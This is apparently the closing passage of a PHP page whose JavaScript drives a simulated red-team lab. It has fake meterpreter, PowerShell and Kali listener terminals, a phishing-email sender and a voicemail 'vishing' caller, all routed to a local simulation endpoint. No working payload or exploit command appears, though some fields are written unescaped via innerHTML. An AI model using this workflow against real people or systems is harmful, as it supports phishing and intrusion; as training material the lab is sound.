                statusEl.textContent = 'Unable to reach the TTS service.';
            })
            .finally(() => {
                submitBtn.disabled = false;
            });
    });
})();

(() => {
    const attachmentSelect = document.getElementById('phish-attachment-select');
    const attachmentStatus = document.getElementById('phish-attachment-status');
    if (!attachmentSelect) return;

    attachmentSelect.addEventListener('focus', () => {
        if (attachmentStatus) {
            attachmentStatus.textContent = 'Checking for newly generated files...';
        }
        window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({target: 'payload_refresh'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (!Array.isArray(data.files)) {
                    throw new Error('Invalid payload');
                }
                attachmentSelect.innerHTML = '';
                data.files.forEach((fileName) => {
                    const option = document.createElement('option');
                    option.value = fileName;
                    option.textContent = fileName;
                    attachmentSelect.appendChild(option);
                });
                if (attachmentStatus) {
                    attachmentStatus.textContent = data.files.length === 0
                        ? 'No files found. Generate a payload first.'
                        : 'Attachment list refreshed.';
                }
            })
            .catch(() => {
                if (attachmentStatus) {
                    attachmentStatus.textContent = 'Unable to refresh attachment list.';
                }
            });
    });
})();

(() => {
    const container = document.getElementById('meterpreter-terminal');
    if (!container) return;
    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
    const meterpreterTerm = new window.Terminal({
        theme: {
            background: '#05060a',
            foreground: '#e2f3ff',
            cursor: '#00ffc6',
        },
        fontSize: 14,
        rows: 16,
        convertEol: false,
    });
    meterpreterTerm.open(container);
    if (FitAddonClass) {
        const fit = new FitAddonClass();
        meterpreterTerm.loadAddon(fit);
        fit.fit();
        window.addEventListener('resize', () => fit.fit());
    }
    const prompt = 'meterpreter > ';
    let buffer = '';
    const history = [];
    let historyIndex = 0;
    let rowsRendered = 0;

    const moveCursorStart = () => {
        if (rowsRendered > 0) {
            meterpreterTerm.write(`\x1b[${rowsRendered}F`);
        }
        meterpreterTerm.write('\r');
    };

    const clearRendered = () => {
        moveCursorStart();
        for (let i = 0; i <= rowsRendered; i++) {
            meterpreterTerm.write('\x1b[2K\r');
            if (i < rowsRendered) {
                meterpreterTerm.write('\x1b[1B');
            }
        }
        if (rowsRendered > 0) {
            meterpreterTerm.write(`\x1b[${rowsRendered}A`);
        }
    };

    const renderLine = () => {
        clearRendered();
        meterpreterTerm.write(`${prompt}${buffer}`);
        const cols = meterpreterTerm.cols || 80;
        rowsRendered = Math.floor((prompt.length + buffer.length) / cols);
    };

    const writePrompt = (prepend = false) => {
        buffer = '';
        historyIndex = history.length;
        rowsRendered = 0;
        if (prepend) {
            meterpreterTerm.write('\r\n');
        }
        meterpreterTerm.write(prompt);
    };

    const sendCommand = (command) => {
        return window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({command, target: 'meterpreter'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.clear) {
                    meterpreterTerm.clear();
                }
                if (data.output) {
                    meterpreterTerm.writeln(data.output);
                }
                writePrompt(true);
            })
            .catch(() => {
                meterpreterTerm.writeln('Error: meterpreter channel unreachable.');
                writePrompt(true);
            });
    };

    meterpreterTerm.onKey(({key, domEvent}) => {
        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
        if (domEvent.key === 'Enter') {
            domEvent.preventDefault();
            const commandText = buffer;
            clearRendered();
            meterpreterTerm.write(`${prompt}${commandText}\r\n`);
            const trimmed = commandText.trim();
            if (trimmed.length > 0) {
                history.push(trimmed);
                historyIndex = history.length;
            }
            sendCommand(commandText);
        } else if (domEvent.key === 'Backspace') {
            domEvent.preventDefault();
            if (buffer.length > 0) {
                buffer = buffer.slice(0, -1);
                renderLine();
            }
        } else if (domEvent.key === 'ArrowUp') {
            domEvent.preventDefault();
            if (history.length === 0) return;
            if (historyIndex > 0) {
                historyIndex -= 1;
            }
            buffer = history[historyIndex] ?? '';
            renderLine();
        } else if (domEvent.key === 'ArrowDown') {
            domEvent.preventDefault();
            if (historyIndex < history.length - 1) {
                historyIndex += 1;
                buffer = history[historyIndex] ?? '';
            } else {
                historyIndex = history.length;
                buffer = '';
            }
            renderLine();
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
            if (navigator.clipboard?.readText) {
                navigator.clipboard.readText().then((text) => {
                    if (!text) return;
                    buffer += text.replace(/\r/g, '');
                    renderLine();
                }).catch(() => {});
            }
        } else if (printable && key.length === 1) {
            buffer += key;
            renderLine();
        }
    });

    writePrompt(false);
    sendCommand('');
})();

(() => {
    const refreshButton = document.getElementById('meterpreter-refresh-button');
    if (!refreshButton) return;
    refreshButton.addEventListener('click', () => {
        refreshButton.disabled = true;
        refreshButton.textContent = 'Refreshing...';
        window.location.reload();
    });
})();

(() => {
    document.querySelectorAll('.copy-cmd').forEach((button) => {
        button.addEventListener('click', () => {
            const command = button.dataset.command || '';
            if (!command) return;
            if (!navigator.clipboard?.writeText) {
                return;
            }
            navigator.clipboard.writeText(command).then(() => {
                button.classList.add('copied');
                setTimeout(() => button.classList.remove('copied'), 1200);
            }).catch(() => {});
        });
    });
})();

(() => {
    const phishForm = document.getElementById('phishing-form');
    if (!phishForm) return;
    const statusEl = document.getElementById('phishing-status');
    const logEl = document.getElementById('phishing-log');
    const submitBtn = phishForm.querySelector('button[type="submit"]');

    const updateLog = (details) => {
        if (!logEl) return;
        logEl.innerHTML = '';
        const heading = document.createElement('strong');
        heading.textContent = 'Latest delivery';
        logEl.appendChild(heading);

        const meta = document.createElement('p');
        meta.textContent = `${details.sent_label ?? 'Just now'} → ${details.to ?? 'jdoe@zegodefense.com'}`;
        logEl.appendChild(meta);

        if (details.subject) {
            const subjectRow = document.createElement('p');
            subjectRow.innerHTML = `<em>Subject:</em> ${details.subject}`;
            logEl.appendChild(subjectRow);
        }
        if (details.attachment) {
            const attachmentRow = document.createElement('p');
            attachmentRow.innerHTML = `<em>Attachment:</em> ${details.attachment}`;
            logEl.appendChild(attachmentRow);
        }
    };

    phishForm.addEventListener('submit', (event) => {
        event.preventDefault();
        if (submitBtn) {
            submitBtn.disabled = true;
        }
        if (statusEl) {
            statusEl.textContent = 'Simulating secure mail transfer...';
        }
        const formData = new FormData(phishForm);
        const payload = new URLSearchParams();
        formData.forEach((value, key) => {
            payload.append(key, typeof value === 'string' ? value : String(value));
        });
        payload.append('target', 'phish');

        fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: payload,
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (statusEl) {
                    statusEl.textContent = data.message || 'Relay responded.';
                }
                if (data.success && data.details) {
                    updateLog(data.details);
                    const callButton = document.getElementById('phish-call-button');
                    if (callButton) {
                        callButton.disabled = false;
                    }
                    const callStatus = document.getElementById('phish-call-status');
                    if (callStatus && !callStatus.textContent?.startsWith('Last call')) {
                        callStatus.textContent = 'Line armed. Drop the voicemail when ready.';
                    }
                }
            })
            .catch(() => {
                if (statusEl) {
                    statusEl.textContent = 'Unable to reach the phishing relay.';
                }
            })
            .finally(() => {
                if (submitBtn) {
                    submitBtn.disabled = false;
                }
            });
    });
})();

(() => {
    const callButton = document.getElementById('phish-call-button');
    if (!callButton) return;
    const statusEl = document.getElementById('phish-call-status');
    const logEl = document.getElementById('phish-call-log');
    const voicemailSelect = document.getElementById('phish-voicemail-select');
    const voicemailAudio = document.getElementById('phish-voicemail-audio');
    const voicemailBank = window.__voicemailBank || [];

    const updateCallLog = (details) => {
        if (!logEl) return;
        logEl.innerHTML = '';
        const heading = document.createElement('strong');
        heading.textContent = 'Most recent voicemail';
        logEl.appendChild(heading);
        const timeRow = document.createElement('p');
        timeRow.textContent = details.timestamp ?? 'Just now';
        logEl.appendChild(timeRow);
        if (details.voicemail_label) {
            const labelRow = document.createElement('p');
            labelRow.innerHTML = `<em>Clip:</em> ${details.voicemail_label}`;
            logEl.appendChild(labelRow);
        }
        const scriptRow = document.createElement('p');
        scriptRow.textContent = details.script ?? '';
        logEl.appendChild(scriptRow);
    };

    callButton.addEventListener('click', () => {
        if (callButton.disabled) return;
        const selectedId = voicemailSelect?.value || '';
        const selectedEntry = voicemailBank.find((vm) => vm.id === selectedId);
        if (!selectedEntry) {
            if (statusEl) {
                statusEl.textContent = 'Select a generated voicemail before calling.';
            }
            return;
        }
        callButton.disabled = true;
        if (statusEl) {
            statusEl.textContent = 'Dialing target, please wait...';
        }
        const payload = new URLSearchParams({
            target: 'phish_call',
            script: selectedEntry.script ?? '',
            voicemail_label: selectedEntry.label,
        });
        fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: payload,
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (statusEl) {
                    statusEl.textContent = data.message || 'Call completed.';
                }
                if (data.success && data.details) {
                    updateCallLog(data.details);
                    if (voicemailAudio && selectedEntry) {
                        voicemailAudio.hidden = false;
                        voicemailAudio.src = selectedEntry.src;
                    }
                }
            })
            .catch(() => {
                if (statusEl) {
                    statusEl.textContent = 'Unable to reach the switchboard.';
                }
            })
            .finally(() => {
                callButton.disabled = false;
            });
    });
})();

(() => {
    const payloadContainer = document.getElementById('payload-terminal');
    if (!payloadContainer) return;
    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
    const psTerm = new window.Terminal({
        theme: {
            background: '#05060a',
            foreground: '#e2f3ff',
            cursor: '#00ffc6',
        },
        fontSize: 14,
        rows: 18,
        convertEol: false,
    });
    psTerm.open(payloadContainer);
    if (FitAddonClass) {
        const payloadFit = new FitAddonClass();
        psTerm.loadAddon(payloadFit);
        payloadFit.fit();
        window.addEventListener('resize', () => payloadFit.fit());
    }
    psTerm.writeln('Windows PowerShell');
    psTerm.writeln('Copyright (C) Microsoft Corporation. All rights reserved.');
    psTerm.writeln('');

    const payloadPrompt = 'PS C:\\Users\\Deep\\Desktop> ';
    let payloadBuffer = '';
    const payloadHistory = [];
    let payloadHistoryIndex = 0;
    let payloadAwaitingScriptInput = false;
    let payloadRowsRendered = 0;
    let payloadPromptText = payloadPrompt;

    const moveCursorToPayloadStart = () => {
        if (payloadRowsRendered > 0) {
            psTerm.write(`\x1b[${payloadRowsRendered}F`);
        }
        psTerm.write('\r');
    };

    const clearPayloadRendered = () => {
        moveCursorToPayloadStart();
        for (let i = 0; i <= payloadRowsRendered; i++) {
            psTerm.write('\x1b[2K\r');
            if (i < payloadRowsRendered) {
                psTerm.write('\x1b[1B');
            }
        }
        if (payloadRowsRendered > 0) {
            psTerm.write(`\x1b[${payloadRowsRendered}A`);
        }
    };

    const currentPayloadPrompt = () => payloadPromptText;

    const renderPayloadLine = () => {
        clearPayloadRendered();
        const promptText = currentPayloadPrompt();
        psTerm.write(`${promptText}${payloadBuffer}`);
        const cols = psTerm.cols || 80;
        payloadRowsRendered = Math.floor((promptText.length + payloadBuffer.length) / cols);
    };

    const writePayloadPrompt = (prependNewline = false) => {
        payloadBuffer = '';
        payloadHistoryIndex = payloadHistory.length;
        payloadRowsRendered = 0;
        if (prependNewline) {
            psTerm.write('\r\n');
        }
        psTerm.write(currentPayloadPrompt());
    };

    writePayloadPrompt(false);

    psTerm.onPaste?.((data) => {
            if (!data) return;
        payloadBuffer += data.replace(/\r/g, '');
        renderPayloadLine();
    });

    const sendPayloadCommand = (command) => {
        window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({command, target: 'payload'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.clear) {
                    psTerm.clear();
                }
                if (data.output) {
                    psTerm.writeln(data.output);
                }
                const awaiting = !!data.awaiting_prompt;
                if (data.prompt_text) {
                    payloadPromptText = data.prompt_text;
                } else if (!awaiting) {
                    payloadPromptText = payloadPrompt;
                }
                payloadAwaitingScriptInput = awaiting;
                if (payloadAwaitingScriptInput) {
                    payloadBuffer = '';
                    payloadHistoryIndex = payloadHistory.length;
                    payloadRowsRendered = 0;
                    renderPayloadLine();
                }
            })
            .catch(() => {
                psTerm.writeln('Error: unable to reach the payload lab.');
                payloadAwaitingScriptInput = false;
            })
            .finally(() => {
                if (!payloadAwaitingScriptInput) {
                    payloadPromptText = payloadPrompt;
                    writePayloadPrompt(false);
                } else {
                    payloadBuffer = '';
                    payloadHistoryIndex = payloadHistory.length;
                }
            });
    };

    psTerm.onKey(({key, domEvent}) => {
        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
        if (domEvent.key === 'Enter') {
            domEvent.preventDefault();
            const commandText = payloadBuffer;
            const activePrompt = currentPayloadPrompt();
            clearPayloadRendered();
            if (activePrompt) {
                psTerm.write(`${activePrompt}${commandText}\r\n`);
            } else if (commandText.length > 0) {
                psTerm.write(`${commandText}\r\n`);
            } else {
                psTerm.write('\r\n');
            }
            const rawCommand = payloadBuffer;
            const trimmed = rawCommand.trim();
            if (trimmed.length === 0 && !payloadAwaitingScriptInput) {
                writePayloadPrompt(false);
                return;
            }
            if (trimmed.length > 0) {
                payloadHistory.push(trimmed);
                payloadHistoryIndex = payloadHistory.length;
            }
            sendPayloadCommand(rawCommand);
        } else if (domEvent.key === 'Backspace') {
            domEvent.preventDefault();
            if (payloadBuffer.length > 0) {
                payloadBuffer = payloadBuffer.slice(0, -1);
                renderPayloadLine();
            }
        } else if (domEvent.key === 'ArrowUp') {
            domEvent.preventDefault();
            if (payloadHistory.length === 0) {
                return;
            }
            if (payloadHistoryIndex > 0) {
                payloadHistoryIndex -= 1;
            }
            payloadBuffer = payloadHistory[payloadHistoryIndex] ?? '';
            renderPayloadLine();
        } else if (domEvent.key === 'ArrowDown') {
            domEvent.preventDefault();
            if (payloadHistoryIndex < payloadHistory.length - 1) {
                payloadHistoryIndex += 1;
                payloadBuffer = payloadHistory[payloadHistoryIndex] ?? '';
            } else {
                payloadHistoryIndex = payloadHistory.length;
                payloadBuffer = '';
            }
            renderPayloadLine();
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'c') {
            domEvent.preventDefault();
            payloadBuffer = '';
            payloadHistoryIndex = payloadHistory.length;
            window.fetch('/simulation.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({command: '__CTRL_C__', target: 'payload'}),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    if (data.clear) {
                        psTerm.clear();
                    }
                    if (data.output) {
                        psTerm.writeln(data.output);
                    }
                })
                .catch(() => {
                    psTerm.writeln('Error: unable to reach the payload lab.');
                })
                .finally(() => {
                payloadAwaitingScriptInput = false;
                payloadPromptText = payloadPrompt;
                writePayloadPrompt(false);
                });
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
            if (navigator.clipboard?.readText) {
                navigator.clipboard.readText().then((text) => {
                    if (!text) return;
                    payloadBuffer += text.replace(/\r/g, '');
                    renderPayloadLine();
                }).catch(() => {});
            }
        } else if (printable && key.length === 1) {
            payloadBuffer += key;
            renderPayloadLine();
        }
    });
})();

(() => {
    const listenerContainer = document.getElementById('listener-terminal');
    if (!listenerContainer) return;
    const FitAddonClass = window.FitAddon?.FitAddon || window.fitAddon?.FitAddon;
    const listenerTerm = new window.Terminal({
        theme: {
            background: '#03080f',
            foreground: '#e2f3ff',
            cursor: '#00ffc6',
        },
        fontSize: 14,
        rows: 18,
        convertEol: false,
    });
    listenerTerm.open(listenerContainer);
    if (FitAddonClass) {
        const listenerFit = new FitAddonClass();
        listenerTerm.loadAddon(listenerFit);
        listenerFit.fit();
        window.addEventListener('resize', () => listenerFit.fit());
    }

    const shellHeader = '┌──(kali㉿kali)-[~/tmp]';
    const shellPrompt = '└─$ ';
    let listenerPromptText = shellPrompt;
    let listenerBuffer = '';
    const listenerHistory = [];
    let listenerHistoryIndex = 0;
    let listenerRowsRendered = 0;
    let listenerAwaitingPrompt = false;

    const moveCursorToListenerStart = () => {
        if (listenerRowsRendered > 0) {
            listenerTerm.write(`\x1b[${listenerRowsRendered}F`);
        }
        listenerTerm.write('\r');
    };

    const clearListenerRendered = () => {
        moveCursorToListenerStart();
        for (let i = 0; i <= listenerRowsRendered; i++) {
            listenerTerm.write('\x1b[2K\r');
            if (i < listenerRowsRendered) {
                listenerTerm.write('\x1b[1B');
            }
        }
        if (listenerRowsRendered > 0) {
            listenerTerm.write(`\x1b[${listenerRowsRendered}A`);
        }
    };

    const renderListenerLine = () => {
        clearListenerRendered();
        const promptText = listenerPromptText ?? '';
        listenerTerm.write(`${promptText}${listenerBuffer}`);
        const cols = listenerTerm.cols || 80;
        listenerRowsRendered = Math.floor(((promptText.length) + listenerBuffer.length) / cols);
    };

    const writeListenerPrompt = (prependNewline = false) => {
        listenerBuffer = '';
        listenerHistoryIndex = listenerHistory.length;
        listenerRowsRendered = 0;
        if (prependNewline) {
            listenerTerm.write('\r\n');
        }
        if (!listenerAwaitingPrompt && listenerPromptText === shellPrompt) {
            listenerTerm.writeln(shellHeader);
        }
        if (listenerPromptText) {
            listenerTerm.write(listenerPromptText);
        }
    };

    writeListenerPrompt(false);

    listenerTerm.onPaste?.((data) => {
        if (!data) return;
        listenerBuffer += data.replace(/\r/g, '');
        renderListenerLine();
    });

    const sendListenerCommand = (command) => {
        window.fetch('/simulation.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({command, target: 'listener'}),
        })
            .then((resp) => resp.json())
            .then((data) => {
                if (data.clear) {
                    listenerTerm.clear();
                }
                if (data.output) {
                    listenerTerm.writeln(data.output);
                }
                const awaiting = !!data.awaiting_prompt;
                if (typeof data.prompt_text === 'string' && data.prompt_text !== null) {
                    listenerPromptText = data.prompt_text;
                } else if (!awaiting) {
                    listenerPromptText = shellPrompt;
                }
                listenerAwaitingPrompt = awaiting;
            })
            .catch(() => {
                listenerTerm.writeln('Error: unable to reach the listener lab.');
                listenerAwaitingPrompt = false;
                listenerPromptText = shellPrompt;
            })
            .finally(() => {
                if (!listenerAwaitingPrompt) {
                    writeListenerPrompt(false);
                } else {
                    listenerBuffer = '';
                    listenerHistoryIndex = listenerHistory.length;
                    listenerRowsRendered = 0;
                }
            });
    };

    listenerTerm.onKey(({key, domEvent}) => {
        const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;
        if (domEvent.key === 'Enter') {
            domEvent.preventDefault();
            const commandText = listenerBuffer;
            const activePrompt = listenerPromptText || '';
            clearListenerRendered();
            if (activePrompt) {
                listenerTerm.write(`${activePrompt}${commandText}\r\n`);
            } else if (commandText.length > 0) {
                listenerTerm.write(`${commandText}\r\n`);
            } else {
                listenerTerm.write('\r\n');
            }
            const rawCommand = listenerBuffer;
            const trimmed = rawCommand.trim();
            if (trimmed.length === 0) {
                if (!listenerAwaitingPrompt) {
                    writeListenerPrompt(false);
                }
                return;
            }
            listenerHistory.push(trimmed);
            listenerHistoryIndex = listenerHistory.length;
            sendListenerCommand(rawCommand);
        } else if (domEvent.key === 'Backspace') {
            domEvent.preventDefault();
            if (listenerBuffer.length > 0) {
                listenerBuffer = listenerBuffer.slice(0, -1);
                renderListenerLine();
            }
        } else if (domEvent.key === 'ArrowUp') {
            domEvent.preventDefault();
            if (listenerHistory.length === 0) {
                return;
            }
            if (listenerHistoryIndex > 0) {
                listenerHistoryIndex -= 1;
            }
            listenerBuffer = listenerHistory[listenerHistoryIndex] ?? '';
            renderListenerLine();
        } else if (domEvent.key === 'ArrowDown') {
            domEvent.preventDefault();
            if (listenerHistoryIndex < listenerHistory.length - 1) {
                listenerHistoryIndex += 1;
                listenerBuffer = listenerHistory[listenerHistoryIndex] ?? '';
            } else {
                listenerHistoryIndex = listenerHistory.length;
                listenerBuffer = '';
            }
            renderListenerLine();
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'c') {
            domEvent.preventDefault();
            listenerBuffer = '';
            listenerHistoryIndex = listenerHistory.length;
            window.fetch('/simulation.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({command: '__CTRL_C__', target: 'listener'}),
            })
                .then((resp) => resp.json())
                .then((data) => {
                    if (data.clear) {
                        listenerTerm.clear();
                    }
                    if (data.output) {
                        listenerTerm.writeln(data.output);
                    }
                    if (typeof data.prompt_text === 'string') {
                        listenerPromptText = data.prompt_text;
                    } else {
                        listenerPromptText = shellPrompt;
                    }
                    listenerAwaitingPrompt = !!data.awaiting_prompt;
                })
                .catch(() => {
                    listenerTerm.writeln('Error: unable to reach the listener lab.');
                    listenerAwaitingPrompt = false;
                })
                .finally(() => {
                    if (!listenerAwaitingPrompt) {
                        writeListenerPrompt(false);
                    } else {
                        listenerBuffer = '';
                        listenerHistoryIndex = listenerHistory.length;
                    }
                });
        } else if ((domEvent.ctrlKey || domEvent.metaKey) && domEvent.key.toLowerCase() === 'v') {
            if (navigator.clipboard?.readText) {
                navigator.clipboard.readText().then((text) => {
                    if (!text) return;
                    listenerBuffer += text.replace(/\r/g, '');
                    renderListenerLine();
                }).catch(() => {});
            }
        } else if (printable && key.length === 1) {
            listenerBuffer += key;
            renderListenerLine();
        }
    });
})();
</script>
<?php
render_footer();

